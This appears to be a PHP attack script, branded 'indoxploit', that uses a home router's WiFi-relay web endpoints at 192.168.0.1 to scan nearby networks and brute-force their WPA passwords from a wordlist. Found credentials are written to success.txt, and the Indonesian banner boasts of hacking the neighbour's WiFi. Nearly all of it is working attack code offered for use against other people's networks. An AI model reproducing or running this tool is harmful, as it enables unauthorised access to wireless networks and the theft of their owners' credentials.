<?php 
system('clear');
ini_set('display_errors', FALSE);
error_reporting(E_ALL);
ini_set('error_reporting', E_ALL);
echo " ___________________________
< root@indoxploit:~# Omba-S??? >
 ---------------------------
   \         ,        ,
    \       /(        )`
     \      \ \___   / |
            /- _  `-/  '
           (/\/ \ \   /\
           / /   | `    \
           O O   ) /    |
           `-^--'`<     '
          (_.)  _  )   /
           `.___/`    /
             `-----' /
<----.     __ / __   \
<----|====O)))==) \) /====
<----'    `--' `.__,' \
             |        |
              \       /
        ______( (_  / \______
      ,'  ,-----'   |        \
      `--{__________)        \/
\n\n";
$url="192.168.0.1";
$post="/goform/setWifiRelay";
$check="/goform/getStatus?random=0.3479907979886645&modules=internetStatus%2CdeviceStatistics%2CsystemInfo%2CwanAdvCfg%2CwifiRela";

function scan(){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://192.168.0.1/goform/getWifiRelay?random=0.2657587569337556&modules=wifiScan");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$cek= curl_exec($ch);
	$cek = json_decode($cek, true);
	$q=0;
	while ($cek) {
		if ($cek['wifiScan'][$q]["wifiScanSSID"] == NULL) { die;}
	echo "[\e[32m".date(" H:i:s ")."\e[39m] ['".$cek['wifiScan'][$q]["wifiScanSSID"]."']";
	echo "['".$cek['wifiScan'][$q]["wifiScanSignalStrength"]."']";
	echo "['".$cek['wifiScan'][$q]["wifiScanSecurityMode"]."']\n";
	$q++;
	}
}
function ping(){
	sleep(3);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://192.168.0.1/goform/getStatus?random=0.3479907979886645&modules=internetStatus%2CdeviceStatistics%2CsystemInfo%2CwanAdvCfg%2CwifiRelay");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	$cek= curl_exec($ch);
	if ($cek) {
		return "1";
	}else{
		return "0";
	}
}
function checking($url, $check, $sid, $pass){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://192.168.0.1/goform/getStatus?random=0.3479907979886645&modules=internetStatus%2CdeviceStatistics%2CsystemInfo%2CwanAdvCfg%2CwifiRelay");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$cek= curl_exec($ch);
	$cek = json_decode($cek, true);
	$cek = $cek['wifiRelay']["wifiRelayConnectStatus"];
	if ($cek == "bridgeSuccess") {
		echo " \e[32msuccesfully\n";
		$success = "
JADI HACKER MODAL WIFI TETANGGA
+------------------------------------------+
\e[32mDATE:\e[39m ".date(" H:i:s ")."
\e[32mSSID:\e[39m $sid
\e[32mPSWD:\e[39m $pass
+------------------------------------------+
FB: \e[32momba smile\e[39m butuh bantuan?\n\n";
					fwrite(fopen('success.txt', 'a+'), $success);
		echo $success;die;
	}else{
		echo " \e[91mfailed\e[39m";
	}
}
function crecking($url,$post,$sid,$passwd){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url.$post);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "wifiRelaySSID={$sid}&wifiRelayMAC=undefined&wifiRelaySecurityMode=wpawpa2%2Faestkip&wifiRelayChannel=0&module1=wifiRelay&wifiRelayPwd={$passwd}&wifiRelayType=wisp");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$creck = curl_exec($ch);
}
$i=0;
$sid = $argv;
if ($sid[1] == "scan") {
	scan();
}
$count = count(file($sid[2]));
$pass = explode("\n", file_get_contents($sid[2]));
echo "+------------------------------------------+\n";
echo "+------------------------------------------+\n";
while ($i <= $count) {
	echo "[\e[32m".date(" H:i:s ")."\e[39m] ['{$sid[1]}'] ['{$pass[$i]}'] \n";
	crecking($url, $post, $sid[1], $pass[$i]);
	echo "[\e[32m".date(" H:i:s ")."\e[39m] Try again";
	$j=1;
	while (ping() === "0") {
		echo " .";sleep(1);
		if ($j == 15) {
			echo "\n[\e[32m".date(" H:i:s ")."\e[39m] Failed Connection TP-Link";die;
		}
		$j++;
	}echo " \e[32m200\n";
	echo "[\e[32m".date(" H:i:s ")."\e[39m] Checking";
	for ($h=1; $h <= 10 ; $h++) { 
		echo " .";sleep(1);
	}
	checking($url, $check, $sid[1], $pass[$i]);
	echo "\n";
$i++;
}